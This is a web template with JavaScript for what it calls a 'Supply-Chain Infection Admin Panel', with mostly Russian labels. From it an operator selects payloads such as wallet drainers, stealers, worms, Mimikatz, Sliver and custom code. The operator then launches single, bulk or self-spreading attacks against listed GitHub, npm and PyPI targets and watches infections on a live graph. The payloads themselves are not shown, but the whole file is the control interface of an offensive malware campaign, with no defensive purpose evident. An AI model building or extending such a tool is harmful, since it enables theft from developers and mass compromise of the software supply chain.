{% extends "shared/base_layout.html" %}
{% block title %}Supply-Chain Admin{% endblock %}
{% block content %}
<div class="card">
    <h2>Supply-Chain Infection Admin Panel</h2>
    <button class="btn btn-danger" onclick="launchWormAttack()">Запустить worm-атаку (массовое распространение)</button>
    <form id="bulk-attack-form" method="post" action="/supply_chain_admin/bulk_attack" onsubmit="return launchBulkAttack();">
        <div style="margin-bottom:10px;">
            <select name="payload" id="bulk-payload" onchange="toggleCustomPayload(this.value)">
                <option value="drainer">Drainer</option>
                <option value="stealer">Stealer</option>
                <option value="ats">ATS</option>
                <option value="worm">Worm</option>
                <option value="metasploit">Metasploit</option>
                <option value="mimikatz">Mimikatz</option>
                <option value="impacket">Impacket</option>
                <option value="sliver">Sliver</option>
                <option value="bof">BOF</option>
                <option value="cme">CME</option>
                <option value="custom">Custom</option>
            </select>
            <textarea name="custom_payload_code" id="bulk-custom-payload" style="display:none;width:100%;height:60px;margin-top:5px;" placeholder="Путь к .rc/.ps1 или кастомный payload (JS, Python, shell)"></textarea>
            <button type="submit" class="btn btn-danger">Bulk-атака по выбранным</button>
        </div>
        <!-- Визуализация графа заражений -->
        <div id="infection-graph" style="height:400px; background:#181818; margin-bottom:20px; border:1px solid #333;"></div>
        <form method="get" class="filter-bar">
            <input type="text" name="target" placeholder="Поиск по цели..." value="{{ request.query_params.get('target', '') }}">
            <select name="payload">
                <option value="">Все payload-ы</option>
                <option value="drainer">Drainer</option>
                <option value="stealer">Stealer</option>
                <option value="ats">ATS</option>
                <option value="worm">Worm</option>
            </select>
            <select name="status">
                <option value="">Все статусы</option>
                <option value="success">Успешно</option>
                <option value="error">Ошибка</option>
            </select>
            <button type="submit" class="btn">Фильтр</button>
        </form>
        <table class="table">
            <thead>
                <tr>
                    <th><input type="checkbox" onclick="toggleAll(this)"></th>
                    <th>Время</th>
                    <th>Тип</th>
                    <th>Цель</th>
                    <th>Payload</th>
                    <th>Статус</th>
                    <th>Действия</th>
                </tr>
            </thead>
            <tbody>
                {% for report in reports %}
                    {% for result in report.infection_results %}
                    <tr>
                        <td><input type="checkbox" name="targets" value="{{ result.target | tojson | safe }}"></td>
                        <td>{{ result.timestamp }}</td>
                        <td>{{ result.target.type }}</td>
                        <td><a href="{{ result.target.repo or result.target.links.homepage or result.target.repo_url or '#' }}" target="_blank">{{ result.target.name }}</a></td>
                        <td>{{ result.payload }}</td>
                        <td>{{ result.status }}</td>
                        <td>
                            <a href="/supply_chain_admin/view_report?path={{ report.report_file }}" class="btn">Детали</a>
                            <form class="attack-form" style="display:inline;" method="post" action="/supply_chain_admin/attack" onsubmit="return launchAttack(this);">
                                <input type="hidden" name="target_json" value="{{ result.target | tojson | safe }}">
                                <select name="payload" onchange="toggleCustomPayloadSingle(this, this.form)">
                                    <option value="drainer">Drainer</option>
                                    <option value="stealer">Stealer</option>
                                    <option value="ats">ATS</option>
                                    <option value="worm">Worm</option>
                                    <option value="metasploit">Metasploit</option>
                                    <option value="mimikatz">Mimikatz</option>
                                    <option value="impacket">Impacket</option>
                                    <option value="sliver">Sliver</option>
                                    <option value="bof">BOF</option>
                                    <option value="cme">CME</option>
                                    <option value="custom">Custom</option>
                                </select>
                                <textarea name="custom_payload_code" style="display:none;width:100%;height:40px;margin-top:3px;" placeholder="Путь к .rc/.ps1 или кастомный payload"></textarea>
                                <button type="submit" class="btn btn-danger">Запустить атаку</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                {% endfor %}
            </tbody>
        </table>
    </form>
</div>
{% endblock %}
{% block scripts %}
<script src="https://d3js.org/d3.v7.min.js"></script>
<script>
let infectionGraphData = {nodes: [], links: []};
let nodeMap = {};
let ws;

function toggleCustomPayload(val) {
    document.getElementById('bulk-custom-payload').style.display = (val === 'custom' || val === 'metasploit' || val === 'mimikatz') ? '' : 'none';
}
function toggleCustomPayloadSingle(sel, form) {
    const ta = form.querySelector('textarea[name="custom_payload_code"]');
    ta.style.display = (sel.value === 'custom' || sel.value === 'metasploit' || sel.value === 'mimikatz') ? '' : 'none';
}

function launchAttack(form) {
    const data = new FormData(form);
    fetch(form.action, {
        method: 'POST',
        body: data
    })
    .then(r => r.json())
    .then(resp => {
        alert(resp.message || 'Атака запущена!');
        window.location.reload();
    })
    .catch(() => alert('Ошибка запуска атаки'));
    return false;
}
function launchWormAttack() {
    if (!confirm('Запустить worm-атаку? Это приведёт к массовому распространению по всем найденным цепочкам!')) return;
    fetch('/supply_chain_admin/worm_attack', {method: 'POST'})
        .then(r => r.json())
        .then(resp => {
            alert(resp.message || 'Worm-атака запущена!');
            window.location.reload();
        })
        .catch(() => alert('Ошибка запуска worm-атаки'));
}
// Визуализация графа заражений (данные будут подгружаться через API)
fetch('/api/supply_chain/infection_graph')
    .then(r => r.json())
    .then(data => {
        infectionGraphData = data;
        for (const n of data.nodes) nodeMap[n.id] = n;
        renderInfectionGraph(data);
    });

function renderInfectionGraph(graph) {
    const width = document.getElementById('infection-graph').offsetWidth;
    const height = 400;
    const svg = d3.select('#infection-graph').append('svg')
        .attr('width', width)
        .attr('height', height);
    const simulation = d3.forceSimulation(graph.nodes)
        .force('link', d3.forceLink(graph.links).id(d => d.id).distance(80))
        .force('charge', d3.forceManyBody().strength(-200))
        .force('center', d3.forceCenter(width/2, height/2));
    const link = svg.append('g').selectAll('line')
        .data(graph.links).enter().append('line')
        .attr('stroke', '#888').attr('stroke-width', 2);
    const node = svg.append('g').selectAll('circle')
        .data(graph.nodes).enter().append('circle')
        .attr('r', 16)
        .attr('fill', d => d.type === 'github' ? '#6e40c9' : d.type === 'npm' ? '#cb3837' : d.type === 'pypi' ? '#3775a9' : '#00bfae')
        .call(drag(simulation));
    const label = svg.append('g').selectAll('text')
        .data(graph.nodes).enter().append('text')
        .attr('x', 20).attr('y', 5)
        .text(d => d.name).attr('fill', '#fff').attr('font-size', 12);
    simulation.on('tick', () => {
        link.attr('x1', d => d.source.x).attr('y1', d => d.source.y)
            .attr('x2', d => d.target.x).attr('y2', d => d.target.y);
        node.attr('cx', d => d.x).attr('cy', d => d.y);
        label.attr('x', d => d.x+18).attr('y', d => d.y+4);
    });
    function drag(simulation) {
        function dragstarted(event, d) {
            if (!event.active) simulation.alphaTarget(0.3).restart();
            d.fx = d.x; d.fy = d.y;
        }
        function dragged(event, d) {
            d.fx = event.x; d.fy = event.y;
        }
        function dragended(event, d) {
            if (!event.active) simulation.alphaTarget(0);
            d.fx = null; d.fy = null;
        }
        return d3.drag().on('start', dragstarted).on('drag', dragged).on('end', dragended);
    }
}

function addInfectionToGraph(res) {
    const tid = res.target.type + ':' + res.target.name;
    if (!nodeMap[tid]) {
        const node = {id: tid, name: res.target.name, type: res.target.type};
        infectionGraphData.nodes.push(node);
        nodeMap[tid] = node;
    }
    if (res.parent) {
        infectionGraphData.links.push({source: res.parent, target: tid});
    }
    d3.select('#infection-graph').selectAll('*').remove();
    renderInfectionGraph(infectionGraphData);
}

function addInfectionToTable(res) {
    const table = document.querySelector('.table tbody');
    const tr = document.createElement('tr');
    tr.innerHTML = `
        <td></td>
        <td>${res.timestamp}</td>
        <td>${res.target.type}</td>
        <td><a href="${res.target.repo || res.target.links?.homepage || res.target.repo_url || '#'}" target="_blank">${res.target.name}</a></td>
        <td>${res.payload}</td>
        <td>${res.status}</td>
        <td>
            <span class="btn">Live</span>
        </td>
    `;
    table.prepend(tr);
}

function setupWS() {
    ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws/supply_chain_admin');
    ws.onmessage = function(event) {
        const msg = JSON.parse(event.data);
        if (msg.type === 'infection') {
            addInfectionToGraph(msg.result);
            addInfectionToTable(msg.result);
        }
    };
}
setupWS();

function launchBulkAttack() {
    const form = document.getElementById('bulk-attack-form');
    const data = new FormData(form);
    fetch(form.action, {
        method: 'POST',
        body: data
    })
    .then(r => r.json())
    .then(resp => {
        alert(resp.message || 'Bulk-атака запущена!');
        window.location.reload();
    })
    .catch(() => alert('Ошибка запуска bulk-атаки'));
    return false;
}
</script>
{% endblock %} 